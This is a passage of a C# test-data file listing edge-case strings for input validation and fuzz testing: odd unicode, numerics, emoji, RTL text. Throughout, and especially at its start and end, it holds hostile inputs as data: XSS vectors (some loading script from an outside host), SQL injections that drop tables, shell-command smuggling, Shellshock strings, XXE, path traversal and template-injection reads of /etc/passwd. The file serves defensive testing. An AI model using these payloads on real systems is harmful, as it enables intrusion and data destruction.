            "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108" +
    ";&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
            "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105" +
    "&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#000004" +
    "0&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
            "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#" +
    "x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
            "<IMG SRC=\"jav   ascript:alert(\'XSS\');\">",
            "<IMG SRC=\"jav&#x09;ascript:alert(\'XSS\');\">",
            "<IMG SRC=\"jav&#x0A;ascript:alert(\'XSS\');\">",
            "<IMG SRC=\"jav&#x0D;ascript:alert(\'XSS\');\">",
            "perl -e \'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";\' > out",
            "<IMG SRC=\" &#14;  javascript:alert(\'XSS\');\">",
            "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
            "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
            "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
            "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
            "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >",
            "<SCRIPT SRC=//ha.ckers.org/.j>",
            "<IMG SRC=\"javascript:alert(\'XSS\')\"",
            "<iframe src=http://ha.ckers.org/scriptlet.html <",
            "\\\";alert(\'XSS\');//",
            "<u oncopy=alert()> Copy me</u>",
            "<i onwheel=alert(1)> Scroll over me </i>",
            "<plaintext>",
            "http://a/%%30%30",
            "</textarea><script>alert(123)</script>",
            "1;DROP TABLE users",
            "1\'; DROP TABLE users-- 1",
            "\' OR 1=1 -- 1",
            "\' OR \'1\'=\'1",
            "\'; EXEC sp_MSForEachTable \'DROP TABLE ?\'; --",
            " ",
            "%",
            "_",
            "-",
            "--",
            "--version",
            "--help",
            "$USER",
            "/dev/null; touch /tmp/blns.fail ; echo",
            "`touch /tmp/blns.fail`",
            "$(touch /tmp/blns.fail)",
            "@{[system \"touch /tmp/blns.fail\"]}",
            "eval(\"puts \'hello world\'\")",
            "System(\"ls -al /\")",
            "`ls -al /`",
            "Kernel.exec(\"ls -al /\")",
            "Kernel.exit(1)",
            "%x(\'ls -al /\')",
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!E" +
    "NTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
            "$HOME",
            "$ENV{\'HOME\'}",
            "%d",
            "%s%s%s%s%s",
            "{0}",
            "%*.*s",
            "%@",
            "%n",
            "File:///",
            "../../../../../../../../../../../etc/passwd%00",
            "../../../../../../../../../../../etc/hosts",
            "() { 0; }; touch /tmp/blns.shellshock1.fail;",
            "() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }",
            "<<< %s(un=\'%s\') = %u",
            "+++ATH0",
            "CON",
            "PRN",
            "AUX",
            "CLOCK$",
            "NUL",
            "A:",
            "ZZ:",
            "COM1",
            "LPT1",
            "LPT2",
            "LPT3",
            "COM2",
            "COM3",
            "COM4",
            "DCC SEND STARTKEYLOGGER 0 0 0",
            "Scunthorpe General Hospital",
            "Penistone Community Church",
            "Lightwater Country Park",
            "Jimmy Clitheroe",
            "Horniman Museum",
            "shitake mushrooms",
            "RomansInSussex.co.uk",
            "http://www.cum.qc.ca/",
            "Craig Cockburn, Software Specialist",
            "Linda Callahan",
            "Dr. Herman I. Libshitz",
            "magna cum laude",
            "Super Bowl XXX",
            "medieval erection of parapets",
            "evaluate",
            "mocha",
            "expression",
            "Arsenal canal",
            "classic",
            "Tyson Gay",
            "Dick Van Dyke",
            "basement",
            "If you\'re reading this, you\'ve been in a coma for almost 20 years now. We\'re tryi" +
    "ng a new technique. We don\'t know where this message will end up in your dream, " +
    "but we hope it works. Please wake up, we miss you.",
            "Roses are [0;31mred[0m, violets are [0;34mblue. Hope you enjoy terminal hue",
            "But now...[20Cfor my greatest trick...[8m",
            "The quick brown fox... [Beeeep]",
            "Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗",
            "🏳0🌈️",
            "జ్ఞ‌ా",
            "گچپژ",
            "{% print \'x\' * 64 * 1024**3 %}",
            "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}",
        };

        /// <summary>
        ///  Strings which may be used elsewhere in code.
        /// </summary>
        public static IReadOnlyList<string> ReservedStrings = new List<string>
        {
            "undefined",
            "undef",
            "null",
            "NULL",
            "(null)",
            "nil",
            "NIL",
            "true",
            "false",
            "True",
            "False",
            "TRUE",
            "FALSE",
            "None",
            "hasOwnProperty",
            "then",
            "constructor",
            "\\",
            "\\\\",
        };

        /// <summary>
        ///  Strings which can be interpreted as numeric.
        /// </summary>
        public static IReadOnlyList<string> NumericStrings = new List<string>
        {
            "0",
            "1",
            "1.00",
            "$1.00",
            "1/2",
            "1E2",
            "1E02",
            "1E+02",
            "-1",
            "-1.00",
            "-$1.00",
            "-1/2",
            "-1E2",
            "-1E02",
            "-1E+02",
            "1/0",
            "0/0",
            "-2147483648/-1",
            "-9223372036854775808/-1",
            "-0",
            "-0.0",
            "+0",
            "+0.0",
            "0.00",
            "0..0",
            ".",
            "0.0.0",
            "0,00",
            "0,,0",
            ",",
            "0,0,0",
            "0.0/0",
            "1.0/0.0",
            "0.0/0.0",
            "1,0/0,0",
            "0,0/0,0",
            "--1",
            "-",
            "-.",
            "-,",
            "999999999999999999999999999999999999999999999999999999999999999999999999999999999" +
    "999999999999999",
            "NaN",
            "Infinity",
            "-Infinity",
            "INF",
            "1#INF",
            "-1#IND",
            "1#QNAN",
            "1#SNAN",
            "1#IND",
            "0x0",
            "0xffffffff",
            "0xffffffffffffffff",
            "0xabad1dea",
            "123456789012345678901234567890123456789",
            "1,000.00",
            "1 000.00",
            "1\'000.00",
            "1,000,000.00",
            "1 000 000.00",
            "1\'000\'000.00",
            "1.000,00",
            "1 000,00",
            "1\'000,00",
            "1.000.000,00",
            "1 000 000,00",
            "1\'000\'000,00",
            "01000",
            "08",
            "09",
            "2.2250738585072011e-308",
        };

        /// <summary>
        ///  ASCII punctuation.  All of these characters may need to be escaped in some contexts.  Divided into three groups based on (US-layout) keyboard position.
        /// </summary>
        public static IReadOnlyList<string> SpecialCharacters = new List<string>
        {
            ",./;\'[]\\-=",
            "<>?:\"{}|_+",
            "!@#$%^&*()`~",
            "",
            "",
            @"\t              ​\u2028\u2029  　",
            @"­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿",
            "﻿",
            "￾",
        };

        /// <summary>
        ///  Strings which contain common unicode symbols (e.g. smart quotes).
        /// </summary>
        public static IReadOnlyList<string> UnicodeSymbols = new List<string>
        {
            "Ω≈ç√∫˜µ≤≥÷",
            "åß∂ƒ©˙∆˚¬…æ",
            "œ∑´®†¥¨ˆøπ“‘",
            "¡™£¢∞§¶•ªº–≠",
            "¸˛Ç◊ı˜Â¯˘¿",
            "ÅÍÎÏ˝ÓÔÒÚÆ☃",
            "Œ„´‰ˇÁ¨ˆØ∏”’",
            "`⁄€‹›ﬁﬂ‡°·‚—±",
            "⅛⅜⅝⅞",
            "ЁЂЃЄЅІЇЈЉЊЋЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя",
            "٠١٢٣٤٥٦٧٨٩",
        };

        /// <summary>
        ///  Strings which contain unicode subscripts/superscripts; can cause rendering issues.
        /// </summary>
        public static IReadOnlyList<string> UnicodeSubscriptSuperscriptAccents = new List<string>
        {
            "⁰⁴⁵",
            "₀₁₂",
            "⁰⁴⁵₀₁₂",
            @"ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็",
        };

        /// <summary>
        ///  Strings which contain misplaced quotation marks; can cause encoding errors.
        /// </summary>
        public static IReadOnlyList<string> QuotationMarks = new List<string>
        {
            "\'",
            "\"",
            "\'\'",
            "\"\"",
            "\'\"\'",
            "\"\'\'\'\'\"\'\"",
            "\"\'\"\'\"\'\'\'\'\"",
            "<foo val=“bar” />",
            "<foo val=“bar” />",
            "<foo val=”bar“ />",
            "<foo val=`bar\' />",
        };

        /// <summary>
        ///  Strings which contain two-byte characters: can cause rendering issues or character-length issues.
        /// </summary>
        public static IReadOnlyList<string> TwoByteCharacters = new List<string>
        {
            "田中さんにあげて下さい",
            "パーティーへ行かないか",
            "和製漢語",
            "部落格",
            "사회과학원 어학연구소",
            "찦차를 타고 온 펲시맨과 쑛다리 똠방각하",
            "社會科學院語學研究所",
            "울란바토르",
            "𠜎𠜱𠝹𠱓𠱸𠲖𠳏",
        };

        /// <summary>
        /// .
        /// </summary>
        public static IReadOnlyList<string> Stringswhichcontaintwobyteletters = new List<string>
        {
            "𐐜 𐐔𐐇𐐝𐐀𐐡𐐇𐐓 𐐙𐐊𐐡𐐝𐐓/𐐝𐐇𐐗𐐊𐐤𐐔 𐐒𐐋𐐗 𐐒𐐌 𐐜 𐐡𐐀𐐖𐐇𐐤𐐓𐐝 𐐱𐑂 𐑄 𐐔" +
    "𐐇𐐝𐐀𐐡𐐇𐐓 𐐏𐐆𐐅𐐤𐐆𐐚𐐊𐐡𐐝𐐆𐐓𐐆",
        };

        /// <summary>
        ///  A super string recommended by VMware Inc. Globalization Team: can effectively cause rendering issues or character-length issues to validate product globalization readiness.  表          CJK_UNIFIED_IDEOGRAPHS (U+8868) ポ          KATAKANA LETTER PO (U+30DD) あ          HIRAGANA LETTER A (U+3042) A           LATIN CAPITAL LETTER A (U+0041) 鷗          CJK_UNIFIED_IDEOGRAPHS (U+9DD7) Œ           LATIN SMALL LIGATURE OE (U+0153) é           LATIN SMALL LETTER E WITH ACUTE (U+00E9) Ｂ           FULLWIDTH LATIN CAPITAL LETTER B (U+FF22) 逍          CJK_UNIFIED_IDEOGRAPHS (U+900D) Ü           LATIN SMALL LETTER U WITH DIAERESIS (U+00FC) ß           LATIN SMALL LETTER SHARP S (U+00DF) ª           FEMININE ORDINAL INDICATOR (U+00AA) ą           LATIN SMALL LETTER A WITH OGONEK (U+0105) ñ           LATIN SMALL LETTER N WITH TILDE (U+00F1) 丂          CJK_UNIFIED_IDEOGRAPHS (U+4E02) 㐀          CJK Ideograph Extension A, First (U+3400) 𠀀          CJK Ideograph Extension B, First (U+20000).
        /// </summary>
        public static IReadOnlyList<string> SpecialUnicodeCharactersUnion = new List<string>
        {
            "表",
            "ポ",
            "あ",
            "A",
            "鷗",
            "Œ",
            "é",
            "Ｂ",
            "逍",
            "Ü",
            "ß",
            "ª",
            "ą",
            "ñ",
            "丂",
            "㐀",
            "𠀀",
        };

        /// <summary>
        ///  Characters which increase in length (2 to 3 bytes) when lowercased Credit: https://twitter.com/jifa/status/625776454479970304.
        /// </summary>
        public static IReadOnlyList<string> Changinglengthwhenlowercased = new List<string>
        {
            "Ⱥ",
            "Ⱦ",
        };

        /// <summary>
        ///  Strings which consists of Japanese-style emoticons which are popular on the web.
        /// </summary>
        public static IReadOnlyList<string> JapaneseEmoticons = new List<string>
        {
            "ヽ༼ຈل͜ຈ༽ﾉ ヽ༼ຈل͜ຈ༽ﾉ",
            "(｡◕ ∀ ◕｡)",
            "｀ｨ(´∀｀∩",
            "__ﾛ(,_,*)",
            "・(￣∀￣)・:*:",
            "ﾟ･✿ヾ╲(｡◕‿◕｡)╱✿･ﾟ",
            ",。・:*:・゜’( ☻ ω ☻ )。・:*:・゜’",
            "(╯°□°）╯︵ ┻━┻)",
            "(ﾉಥ益ಥ）ﾉ﻿ ┻━┻",
            "┬─┬ノ( º _ ºノ)",
            "( ͡° ͜ʖ ͡°)",
            "¯\\_(ツ)_/¯",
        };

        /// <summary>
        ///  Strings which contain Emoji; should be the same behavior as two-byte characters, but not always.
        /// </summary>
        public static IReadOnlyList<string> Emoji = new List<string>
        {
            "😍",
            "👩🏽",
            "👨‍🦰 👨🏿‍🦰 👨‍🦱 👨🏿‍🦱 🦹🏿‍♂️",
            "👾 🙇 💁 🙅 🙆 🙋 🙎 🙍",
            "🐵 🙈 🙉 🙊",
            "❤️ 💔 💌 💕 💞 💓 💗 💖 💘 💝 💟 💜 💛 💚 💙",
            "✋🏿 💪🏿 👐🏿 🙌🏿 👏🏿 🙏🏿",
            "👨‍👩‍👦 👨‍👩‍👧‍👦 👨‍👨‍👦 👩‍👩‍👧 👨‍👦 👨‍👧‍👦 👩‍👦 👩‍👧‍👦",
            "🚾 🆒 🆓 🆕 🆖 🆗 🆙 🏧",
            "0️⃣ 1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣ 6️⃣ 7️⃣ 8️⃣ 9️⃣ 🔟",
            "🇺🇸🇷🇺🇸 🇦🇫🇦🇲🇸",
            "🇺🇸🇷🇺🇸🇦🇫🇦🇲",
            "🇺🇸🇷🇺🇸🇦",
        };

        /// <summary>
        ///  Strings which contain unicode numbers; if the code is localized, it should see the input as numeric.
        /// </summary>
        public static IReadOnlyList<string> UnicodeNumbers = new List<string>
        {
            "１２３",
            "١٢٣",
        };

        /// <summary>
        ///  Strings which contain text that should be rendered RTL if possible (e.g. Arabic, Hebrew).
        /// </summary>
        public static IReadOnlyList<string> RightToLeftStrings = new List<string>
        {
            "ثم نفس سقطت وبالتحديد،, جزيرتي باستخدام أن دنو. إذ هنا؟ الستار وتنصيب كان. أهّل ا" +
    "يطاليا، بريطانيا-فرنسا قد أخذ. سليمان، إتفاقية بين ما, يذكر الحدود أي بعد, معامل" +
    "ة بولندا، الإطلاق عل إيو.",
            "בְּרֵאשִׁית, בָּרָא אֱלֹהִים, אֵת הַשָּׁמַיִם, וְאֵת הָאָרֶץ",
            "הָיְתָהtestالصفحات التّحول",
            "﷽",
            "ﷺ",
            "مُنَاقَشَةُ سُبُلِ اِسْتِخْدَامِ اللُّغَةِ فِي النُّظُمِ الْقَائِمَةِ وَفِيم يَخُ" +
    "صَّ التَّطْبِيقَاتُ الْحاسُوبِيَّةُ،",
            "الكل في المجمو عة (5)",
        };

        /// <summary>
        ///  The only unicode alphabet to use a space which isn't empty but should still act like a space.
        /// </summary>
        public static IReadOnlyList<string> OghamText = new List<string>
        {
            "᚛ᚄᚓᚐᚋᚒᚄ ᚑᚄᚂᚑᚏᚅ᚜",
            "᚛                 ᚜",
        };

        /// <summary>
        ///  Strings which contain unicode with unusual properties (e.g. Right-to-left override) (c.f. http://www.unicode.org/charts/PDF/U2000.pdf).
        /// </summary>
        public static IReadOnlyList<string> TrickUnicode = new List<string>
        {
            "‪‪test‪",
            "‫test‫",
            "\u2029test\u2029",
            "test⁠test‫",
            "⁦test⁧",
        };

        /// <summary>
        ///  Strings which contain "corrupted" text. The corruption will not appear in non-HTML text, however. (via http://www.eeemo.net).
        /// </summary>
        public static IReadOnlyList<string> ZalgoText = new List<string>
        {
            "Ṱ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣" +
    "̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇" +
    "̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣",
            "̡͓̞ͅI̗̘̦͝n͇͇͙v̮̫ok̲̫̙͈i̖͙̭̹̠̞n̡̻̮̣̺g̲͈͙̭͙̬͎ ̰t͔̦h̞̲e̢̤ ͍̬̲͖f̴̘͕̣è͖ẹ̥̩l͖͔͚i͓͚̦͠n͖͍" +
    "̗͓̳̮g͍ ̨o͚̪͡f̘̣̬ ̖̘͖̟͙̮c҉͔̫͖͓͇͖ͅh̵̤̣͚͔á̗̼͕ͅo̼̣̥s̱͈̺̖̦̻͢.̛̖̞̠̫̰",
            "̗̺͖̹̯͓Ṯ̤͍̥͇͈h̲́e͏͓̼̗̙̼̣͔ ͇̜̱̠͓͍ͅN͕͠e̗̱z̘̝̜̺͙p̤̺̹͍̯͚e̠̻̠͜r̨̤͍̺̖͔̖̖d̠̟̭̬̝͟i̦͖̩͓͔̤a̠" +
    "̗̬͉̙n͚͜ ̻̞̰͚ͅh̵͉i̳̞v̢͇ḙ͎͟-҉̭̩̼͔m̤̭̫i͕͇̝̦n̗͙ḍ̟ ̯̲͕͞ǫ̟̯̰̲͙̻̝f ̪̰̰̗̖̭̘͘c̦͍̲̞͍̩̙ḥ͚a̮" +
    "͎̟̙͜ơ̩̹͎s̤.̝̝ ҉Z̡̖̜͖̰̣͉̜a͖̰͙̬͡l̲̫̳͍̩g̡̟̼̱͚̞̬ͅo̗͜.̟",
            "̦H̬̤̗̤͝e͜ ̜̥̝̻͍̟́w̕h̖̯͓o̝͙̖͎̱̮ ҉̺̙̞̟͈W̷̼̭a̺̪͍į͈͕̭͙̯̜t̶̼̮s̘͙͖̕ ̠̫̠B̻͍͙͉̳ͅe̵h̵̬͇̫͙i" +
    "̹͓̳̳̮͎̫̕n͟d̴̪̜̖ ̰͉̩͇͙̲͞ͅT͖̼͓̪͢h͏͓̮̻e̬̝̟ͅ ̤̹̝W͙̞̝͔͇͝ͅa͏͓͔̹̼̣l̴͔̰̤̟͔ḽ̫.͕",
            "Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮",
        };

        /// <summary>
        ///  Strings which contain unicode with an "upsidedown" effect (via http://www.upsidedowntext.com).
        /// </summary>
        public static IReadOnlyList<string> UnicodeUpsidedown = new List<string>
        {
            "˙ɐnbᴉlɐ ɐuƃɐɯ ǝɹolop ʇǝ ǝɹoqɐl ʇn ʇunpᴉpᴉɔuᴉ ɹodɯǝʇ poɯsnᴉǝ op pǝs \'ʇᴉlǝ ƃuᴉɔsᴉdᴉ" +
    "pɐ ɹnʇǝʇɔǝsuoɔ \'ʇǝɯɐ ʇᴉs ɹolop ɯnsdᴉ ɯǝɹo˥",
            "00˙Ɩ$-",
        };

        /// <summary>
        ///  Strings which contain bold/italic/etc. versions of normal characters.
        /// </summary>
        public static IReadOnlyList<string> Unicodefont = new List<string>
        {
            "Ｔｈｅ ｑｕｉｃｋ ｂｒｏｗｎ ｆｏｘ ｊｕｍｐｓ ｏｖｅｒ ｔｈｅ ｌａｚｙ ｄｏｇ",
            "𝐓𝐡𝐞 𝐪𝐮𝐢𝐜𝐤 𝐛𝐫𝐨𝐰𝐧 𝐟𝐨𝐱 𝐣𝐮𝐦𝐩𝐬 𝐨𝐯𝐞𝐫 𝐭𝐡𝐞 𝐥𝐚𝐳𝐲 𝐝𝐨𝐠",
            "𝕿𝖍𝖊 𝖖𝖚𝖎𝖈𝖐 𝖇𝖗𝖔𝖜𝖓 𝖋𝖔𝖝 𝖏𝖚𝖒𝖕𝖘 𝖔𝖛𝖊𝖗 𝖙𝖍𝖊 𝖑𝖆𝖟𝖞 𝖉𝖔𝖌",
            "𝑻𝒉𝒆 𝒒𝒖𝒊𝒄𝒌 𝒃𝒓𝒐𝒘𝒏 𝒇𝒐𝒙 𝒋𝒖𝒎𝒑𝒔 𝒐𝒗𝒆𝒓 𝒕𝒉𝒆 𝒍𝒂𝒛𝒚 𝒅𝒐𝒈",
            "𝓣𝓱𝓮 𝓺𝓾𝓲𝓬𝓴 𝓫𝓻𝓸𝔀𝓷 𝓯𝓸𝔁 𝓳𝓾𝓶𝓹𝓼 𝓸𝓿𝓮𝓻 𝓽𝓱𝓮 𝓵𝓪𝔃𝔂 𝓭𝓸𝓰",
            "𝕋𝕙𝕖 𝕢𝕦𝕚𝕔𝕜 𝕓𝕣𝕠𝕨𝕟 𝕗𝕠𝕩 𝕛𝕦𝕞𝕡𝕤 𝕠𝕧𝕖𝕣 𝕥𝕙𝕖 𝕝𝕒𝕫𝕪 𝕕𝕠𝕘",
            "𝚃𝚑𝚎 𝚚𝚞𝚒𝚌𝚔 𝚋𝚛𝚘𝚠𝚗 𝚏𝚘𝚡 𝚓𝚞𝚖𝚙𝚜 𝚘𝚟𝚎𝚛 𝚝𝚑𝚎 𝚕𝚊𝚣𝚢 𝚍𝚘𝚐",
            "⒯⒣⒠ ⒬⒰⒤⒞⒦ ⒝⒭⒪⒲⒩ ⒡⒪⒳ ⒥⒰⒨⒫⒮ ⒪⒱⒠⒭ ⒯⒣⒠ ⒧⒜⒵⒴ ⒟⒪⒢",
        };

        /// <summary>
        ///  Strings which attempt to invoke a benign script injection; shows vulnerability to XSS.
        /// </summary>
        public static IReadOnlyList<string> ScriptInjection = new List<string>
        {
            "<script>alert(123)</script>",
            "&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;",
            "<img src=x onerror=alert(123) />",
            "<svg><script>123<1>alert(123)</script>",
            "\"><script>alert(123)</script>",
            "\'><script>alert(123)</script>",
            "><script>alert(123)</script>",
            "</script><script>alert(123)</script>",
            "< / script >< script >alert(123)< / script >",
            " onfocus=JaVaSCript:alert(123) autofocus",
            "\" onfocus=JaVaSCript:alert(123) autofocus",
            "\' onfocus=JaVaSCript:alert(123) autofocus",
            "＜script＞alert(123)＜/script＞",
            "<sc<script>ript>alert(123)</sc</script>ript>",
            "--><script>alert(123)</script>",
            "\";alert(123);t=\"",
            "\';alert(123);t=\'",
            "JavaSCript:alert(123)",
            ";alert(123);",
            "src=JaVaSCript:prompt(132)",
            "\"><script>alert(123);</script x=\"",
            "\'><script>alert(123);</script x=\'",
            "><script>alert(123);</script x=",
            "\" autofocus onkeyup=\"javascript:alert(123)",
            "\' autofocus onkeyup=\'javascript:alert(123)",
            "<script\\x20type=\"text/javascript\">javascript:alert(1);</script>",
            "<script\\x3Etype=\"text/javascript\">javascript:alert(1);</script>",
            "<script\\x0Dtype=\"text/javascript\">javascript:alert(1);</script>",
            "<script\\x09type=\"text/javascript\">javascript:alert(1);</script>",
            "<script\\x0Ctype=\"text/javascript\">javascript:alert(1);</script>",
            "<script\\x2Ftype=\"text/javascript\">javascript:alert(1);</script>",
            "<script\\x0Atype=\"text/javascript\">javascript:alert(1);</script>",
            "\'`\"><\\x3Cscript>javascript:alert(1)</script>",
            "\'`\"><\\x00script>javascript:alert(1)</script>",
            "ABC<div style=\"x\\x3Aexpression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:expression\\x5C(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:expression\\x00(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:exp\\x00ression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:exp\\x5Cression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\x0Aexpression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\x09expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE3\\x80\\x80expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x84expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xC2\\xA0expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x80expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x8Aexpression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\x0Dexpression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\x0Cexpression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x87expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xEF\\xBB\\xBFexpression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\x20expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x88expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\x00expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x8Bexpression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x86expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x85expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x82expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\x0Bexpression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x81expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x83expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x89expression(javascript:alert(1)\">DEF",
            "<a href=\"\\x0Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x0Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xC2\\xA0javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x05javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x18javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x11javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x88javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x89javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x17javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x03javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x0Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x1Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x00javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x10javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x82javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x20javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x13javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x09javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x8Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x14javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x19javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\xAFjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x1Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x81javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x1Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x87javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x07javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE1\\x9A\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x83javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
